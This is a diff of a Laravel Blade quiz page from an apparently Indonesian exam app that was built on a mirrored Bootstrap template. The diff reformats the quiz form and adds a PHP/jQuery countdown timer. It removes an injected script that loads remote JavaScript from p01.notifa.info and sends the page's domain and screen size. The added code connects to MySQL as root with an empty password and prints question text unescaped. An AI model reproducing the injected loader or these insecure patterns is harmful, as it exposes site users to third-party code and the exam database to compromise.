@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
 <!-- Mirrored from learnplus-bootstrap.frontendmatter.com/student-take-quiz.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 19 Jan 2020 00:19:21 GMT -->
@@ -56,7 +58,7 @@
                 <nav id="default-navbar" class="navbar navbar-expand navbar-dark bg-primary m-0">
                     <div class="container-fluid">
                         <!-- Toggle sidebar -->
-                       
+
 
                         <!-- Brand -->
                         <a href="" class="navbar-brand">
@@ -74,7 +76,7 @@
                         <!-- Menu -->
                         <ul class="nav navbar-nav flex-nowrap">
 
-                        
+
                             <!-- // END Notifications dropdown -->
                             <!-- User dropdown -->
                             <li class="nav-item dropdown ml-1 ml-md-3">
@@ -141,16 +143,16 @@
                                 </div>
                             </div>
                         </div>
-                       <form id="form" action="{{ route('quis.tambah',['id'=> Request::segment('3') ])}}" method="POST">
-                        @csrf
-                       @php 
-                         $i=1;
-                        
-                       @endphp
-                       @foreach($soal as $value)
-                        @php $o=$i++; @endphp
-                          <input type="hidden" name="id" value="{{ $value->id }}" >
-                          <input type="hidden" name="jumlah" value="{{ $data['jumlah']}}">
+                        <form id="form" action="{{ route('quis.tambah',['id'=> Request::segment('3') ])}}" method="POST">
+                            @csrf
+                            @php 
+                            $i=1;
+
+                            @endphp
+                            @foreach($soal as $value)
+                            @php $o=$i++; @endphp
+                            <input type="hidden" name="id" value="{{ $value->id }}" >
+                            <input type="hidden" name="jumlah" value="{{ $data['jumlah']}}">
                             <div class="card">
                                 <div class="card-header">
                                     <div class="media align-items-center">
@@ -159,117 +161,49 @@
                                         </div>
                                         <div class="media-body">
                                             <h4 class="card-title">
-                                            {!!  $value->soal !!}
+                                                {!!  $value->soal !!}
                                             </h4>
                                         </div>
                                     </div>
                                 </div>
                                 <div class="card-body">
-                                     <?php 
-                                     $no = 1;     
-                                     $data['shuffled'] = DB::table('pilihan')->where('soal_id',$value->id)->get();
-                                     $pilihan = $data['shuffled']->shuffle();
-                                      ?>
+                                   <?php 
+                                   $no = 1;     
+                                   $data['shuffled'] = DB::table('pilihan')->where('soal_id',$value->id)->get();
+                                   $pilihan = $data['shuffled']->shuffle();
+                                   ?>
 
-                                
 
-                                    @foreach($pilihan as $row)
-                                    @php 
-                                    $n = $no++;
-                                    @endphp
-                                    <div class="custom-controls-stacked mt-3">
-                                        <fieldset>
-                                            <div class="custom-control custom-radio">
 
-                                                <input id="radioStacked{{ $o }}--{{ $n }}; ?>" value="{{ $value->id  }}---{{ $row->pilihan  }}" name="jawaban[{{ $o}}]" type="radio" class="custom-control-input">
-                                                <label for="radioStacked{{ $o }}--{{ $n }}; ?>" class="custom-control-label">{{ $row->pilihan }}</label>
-                                            </div>
-                                        </fieldset>
-                                    </div>
-                                    @endforeach
-                                
+                                   @foreach($pilihan as $row)
+                                   @php 
+                                   $n = $no++;
+                                   @endphp
+                                   <div class="custom-controls-stacked mt-3">
+                                    <fieldset>
+                                        <div class="custom-control custom-radio">
+
+                                            <input id="radioStacked{{ $o }}--{{ $n }}; ?>" value="{{ $value->id  }}---{{ $row->pilihan  }}" name="jawaban[{{ $o}}]" type="radio" class="custom-control-input">
+                                            <label for="radioStacked{{ $o }}--{{ $n }}; ?>" class="custom-control-label">{{ $row->pilihan }}</label>
+                                        </div>
+                                    </fieldset>
                                 </div>
-                                <div class="card-footer">
-                                    
+                                @endforeach
                                 
-                                </div>
                             </div>
-                           @endforeach
-                            <button id='submit' type="submit" class="btn btn-success float-right">
-                            Submit 
-                                <i class="material-icons btn__icon--right">send</i>
-                            </button>
-                       </form>
-                  
-                       
-                    </div>
-
-                </div>
+                            <div class="card-footer">
 
 
-
-
-                <div class="mdk-drawer js-mdk-drawer" data-align="end">
-                    <div class="mdk-drawer__content ">
-                        <div class="sidebar sidebar-right sidebar-light bg-white o-hidden" data-perfect-scrollbar>
-                            <div class="sidebar-p-y">
-                                <div class="sidebar-heading">Time left</div>
-                                <div class="countdown sidebar-p-x" data-value="4" data-unit="hour"></div>
-
-                                <div class="sidebar-heading">Pending</div>
-                                <ul class="list-group list-group-fit">
-                                    <li class="list-group-item active">
-                                        <a href="#">
-                                            <span class="media align-items-center">
-                                                <span class="media-left">
-                                                    <span class="btn btn-white btn-circle">#9</span>
-                                                </span>
-                                                <span class="media-body">
-                                                    Github command to deploy comits?
-                                                </span>
-                                            </span>
-                                        </a>
-                                    </li>
-                                    <li class="list-group-item">
-                                        <a href="#">
-                                            <span class="media align-items-center">
-                                                <span class="media-left">
-                                                    <span class="btn btn-white btn-circle">#10</span>
-                                                </span>
-                                                <span class="media-body">
-                                                    What's the difference between private and public repos?
-                                                </span>
-                                            </span>
-                                        </a>
-                                    </li>
-                                    <li class="list-group-item">
-                                        <a href="#">
-                                            <span class="media align-items-center">
-                                                <span class="media-left">
-                                                    <span class="btn btn-white btn-circle">#11</span>
-                                                </span>
-                                                <span class="media-body">
-                                                    What is the purpose of a branch?
-                                                </span>
-                                            </span>
-                                        </a>
-                                    </li>
-                                    <li class="list-group-item">
-                                        <a href="#">
-                                            <span class="media align-items-center">
-                                                <span class="media-left">
-                                                    <span class="btn btn-white btn-circle">#12</span>
-                                                </span>
-                                                <span class="media-body">
-                                                    Final Question?
-                                                </span>
-                                            </span>
-                                        </a>
-                                    </li>
-                                </ul>
                             </div>
                         </div>
-                    </div>
+                        @endforeach
+                        <button id='submit' type="submit" class="btn btn-success float-right">
+                            Submit 
+                            <i class="material-icons btn__icon--right">send</i>
+                        </button>
+                    </form>
+
+
                 </div>
 
             </div>
@@ -277,46 +211,226 @@
 
 
 
-    <!-- jQuery -->
-    <script src="{{asset('assets/quiz/vendor/jquery.min.js')}}"></script>
+            <div class="mdk-drawer js-mdk-drawer" data-align="end">
+                <div class="mdk-drawer__content ">
+                    <div class="sidebar sidebar-right sidebar-light bg-white o-hidden" data-perfect-scrollbar>
+                        <div class="sidebar-p-y">
+                            <div class="sidebar-heading">Time left</div>
+                           <div id='timer'></div>
 
-    <!-- Bootstrap -->
-    <script src="{{asset('assets/quiz/vendor/popper.min.js')}}"></script>
-    <script src="{{asset('assets/quiz/vendor/bootstrap.min.js')}}"></script>
+                            <div class="sidebar-heading">Pending</div>
+                            <ul class="list-group list-group-fit">
+                                <li class="list-group-item active">
+                                    <a href="#">
+                                        <span class="media align-items-center">
+                                            <span class="media-left">
+                                                <span class="btn btn-white btn-circle">#9</span>
+                                            </span>
+                                            <span class="media-body">
+                                                Github command to deploy comits?
+                                            </span>
+                                        </span>
+                                    </a>
+                                </li>
+                                <li class="list-group-item">
+                                    <a href="#">
+                                        <span class="media align-items-center">
+                                            <span class="media-left">
+                                                <span class="btn btn-white btn-circle">#10</span>
+                                            </span>
+                                            <span class="media-body">
+                                                What's the difference between private and public repos?
+                                            </span>
+                                        </span>
+                                    </a>
+                                </li>
+                                <li class="list-group-item">
+                                    <a href="#">
+                                        <span class="media align-items-center">
+                                            <span class="media-left">
+                                                <span class="btn btn-white btn-circle">#11</span>
+                                            </span>
+                                            <span class="media-body">
+                                                What is the purpose of a branch?
+                                            </span>
+                                        </span>
+                                    </a>
+                                </li>
+                                <li class="list-group-item">
+                                    <a href="#">
+                                        <span class="media align-items-center">
+                                            <span class="media-left">
+                                                <span class="btn btn-white btn-circle">#12</span>
+                                            </span>
+                                            <span class="media-body">
+                                                Final Question?
+                                            </span>
+                                        </span>
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
 
-    <!-- Perfect Scrollbar -->
-    <script src="{{asset('assets/quiz/vendor/perfect-scrollbar.min.js')}}"></script>
-
-    <!-- MDK -->
-    <script src="{{asset('assets/quiz/vendor/dom-factory.js')}}"></script>
-    <script src="{{asset('assets/quiz/vendor/material-design-kit.js')}}"></script>
-
-    <!-- App JS -->
-    <script src="{{asset('assets/quiz/js/app.js')}}"></script>
-
-    <!-- Highlight.js -->
-    <script src="{{asset('assets/quiz/js/hljs.js')}}"></script>
-
-    <!-- App Settings (safe to remove) -->
-    <script src="{{asset('assets/quiz/js/app-settings.js')}}"></script>
-
-
-    <!-- Required by countdown -->
-    <script src="{{asset('assets/quiz/vendor/moment.min.js')}}"></script>
-    <!-- Easy Countdown -->
-    <script src="{{asset('assets/quiz/vendor/jquery.countdown.min.js')}}"></script>
-
-
-
-    <!-- Init -->
-    <script src="{{asset('assets/quiz/js/countdown.js')}}"></script>
+        </div>
 
 
 
 
+        <!-- jQuery -->
+        <script src="{{asset('assets/quiz/vendor/jquery.min.js')}}"></script>
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxLUvsTuZxtwfQeWvhf3zyVki5skZyGBhJDJE0CyXRwK%2f4UtXwXs2mLJQXCV7IL7dYVpQ3aPcat26aLlegYpNzTnYWXDRdgHEphaDhC%2byURkcCvloT99%2bdOyKR%2b7Y%2fYOo31TimxiH1xgt7syDD1EYmn5Cx9dCf9olRM2yfGk7nDRjgaY15yaxml3dImVbt0enzHPkUspU4jsAZBcbx42fJVH6c4QbhI1ULYdHDLKWGAC%2f3BxyCMyHf9eGQl2bRR4OJvqRXY5IVh%2bBZEvaX6F65bABi9GnFJ%2b7ug%2f%2bWETCMlEbDX7uYZOHwsYS2dMHf0QWWgRWQRJxakD%2fbf1mcSMcfk8%2fOvGlmJZy%2fADsp0Zg3hSVA8tv0q%2bH82YqR%2b172idCBHIuMgei9JI5Ex1GnES2tWEiaZ1uArbTT6KoPlP8dA3efvKXvYW5Jhb9oTFHk%2ff0T2bbwTi7sEgwCF8jVN8j6MUj%2fzNV2qjUbbFWELo%2bmuOUhH34humMu7SpzvmKEhNVTblnh5Gn7%2bQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+        <!-- Bootstrap -->
+        <script src="{{asset('assets/quiz/vendor/popper.min.js')}}"></script>
+        <script src="{{asset('assets/quiz/vendor/bootstrap.min.js')}}"></script>
+
+        <!-- Perfect Scrollbar -->
+        <script src="{{asset('assets/quiz/vendor/perfect-scrollbar.min.js')}}"></script>
+
+        <!-- MDK -->
+        <script src="{{asset('assets/quiz/vendor/dom-factory.js')}}"></script>
+        <script src="{{asset('assets/quiz/vendor/material-design-kit.js')}}"></script>
+
+        <!-- App JS -->
+        <script src="{{asset('assets/quiz/js/app.js')}}"></script>
+
+        <!-- Highlight.js -->
+        <script src="{{asset('assets/quiz/js/hljs.js')}}"></script>
+
+        <!-- App Settings (safe to remove) -->
+        <script src="{{asset('assets/quiz/js/app-settings.js')}}"></script>
 
 
-<!-- Mirrored from learnplus-bootstrap.frontendmatter.com/student-take-quiz.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 19 Jan 2020 00:19:23 GMT -->
-</html>
+        <!-- Required by countdown -->
+        <script src="{{asset('assets/quiz/vendor/moment.min.js')}}"></script>
+        <!-- Easy Countdown -->
+        <script src="{{asset('assets/quiz/vendor/jquery.countdown.min.js')}}"></script>
+
+
+
+        <!-- Init -->
+        <script src="{{asset('assets/quiz/js/countdown.js')}}"></script>
+
+        <?php 
+// koneksi ke mysqli
+        $servername = "localhost";
+        $username = "root";
+        $password = "";
+        $db = "ujian";
+// Create connection
+        $koneksi = mysqli_connect($servername, $username, $password,$db);
+        ?>
+
+
+        <?php
+    //untuk memulai session
+        session_start();
+
+    //set session dulu dengan nama $_SESSION["mulai"]
+        if (isset($_SESSION["mulai"])) { 
+        //jika session sudah ada
+            $telah_berlalu = time() - $_SESSION["mulai"];
+        } else { 
+        //jika session belum ada
+            $_SESSION["mulai"]  = time();
+            $telah_berlalu      = 0;
+        } 
+        ?>
+
+        <?php
+        $sql    = mysqli_query($koneksi,"select * from timer");   
+        $data   = mysqli_fetch_array($sql);
+
+    $temp_waktu = ($data['waktu']*60) - $telah_berlalu; //dijadikan detik dan dikurangi waktu yang berlalu
+    $temp_menit = (int)($temp_waktu/60);                //dijadikan menit lagi
+    $temp_detik = $temp_waktu%60;                       //sisa bagi untuk detik
+
+    if ($temp_menit < 60) { 
+        /* Apabila $temp_menit yang kurang dari 60 meni */
+        $jam    = 0; 
+        $menit  = $temp_menit; 
+        $detik  = $temp_detik; 
+    } else { 
+        /* Apabila $temp_menit lebih dari 60 menit */           
+        $jam    = (int)($temp_menit/60);    //$temp_menit dijadikan jam dengan dibagi 60 dan dibulatkan menjadi integer 
+        $menit  = $temp_menit%60;           //$temp_menit diambil sisa bagi ($temp_menit%60) untuk menjadi menit
+        $detik  = $temp_detik;
+    }   
+    ?>
+     <script type="text/javascript">
+        $(document).ready(function() {
+            /** Membuat Waktu Mulai Hitung Mundur Dengan 
+                * var detik;
+                * var menit;
+                * var jam;
+            */
+            var detik   = <?= $detik; ?>;
+            var menit   = <?= $menit; ?>;
+            var jam     = <?= $jam; ?>;
+                  
+            /**
+               * Membuat function hitung() sebagai Penghitungan Waktu
+            */
+            function hitung() {
+                /** setTimout(hitung, 1000) digunakan untuk 
+                     * mengulang atau merefresh halaman selama 1000 (1 detik) 
+                */
+                setTimeout(hitung,1000);
+  
+                /** Jika waktu kurang dari 10 menit maka Timer akan berubah menjadi warna merah */
+                if(menit < 10 && jam == 0){
+                    var peringatan = 'style="color:black"';
+                };
+  
+                /** Menampilkan Waktu Timer pada Tag #Timer di HTML yang tersedia */
+                $('#timer').html(
+                    '<h4 align="center"'+peringatan+'><br />' + jam + ' jam : ' + menit + ' menit : ' + detik + ' detik</h4><hr>'
+                );
+  
+                /** Melakukan Hitung Mundur dengan Mengurangi variabel detik - 1 */
+                detik --;
+  
+                /** Jika var detik < 0
+                    * var detik akan dikembalikan ke 59
+                    * Menit akan Berkurang 1
+                */
+                if(detik < 0) {
+                    detik = 59;
+                    menit --;
+  
+                   /** Jika menit < 0
+                        * Maka menit akan dikembali ke 59
+                        * Jam akan Berkurang 1
+                    */
+                    if(menit < 0) {
+                        menit = 59;
+                        jam --;
+  
+                        /** Jika var jam < 0
+                            * clearInterval() Memberhentikan Interval dan submit secara otomatis
+                        */
+                             
+                        if(jam < 0) { 
+                            clearInterval(hitung); 
+                            /** Variable yang digunakan untuk submit secara otomatis di Form */
+                            var frmSoal = document.getElementById("frmSoal"); 
+                            alert('Waktu Anda telah habis, Jika ingin mencoba lagi silahkan dihapus dulu SESSION browser anda');
+                            frmSoal.submit(); 
+                        } 
+                    } 
+                } 
+            }           
+            /** Menjalankan Function Hitung Waktu Mundur */
+            hitung();
+        });
+    </script>
+
+
+
+    </body>
+
+
+    <!-- Mirrored from learnplus-bootstrap.frontendmatter.com/student-take-quiz.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 19 Jan 2020 00:19:23 GMT -->
+    </html>
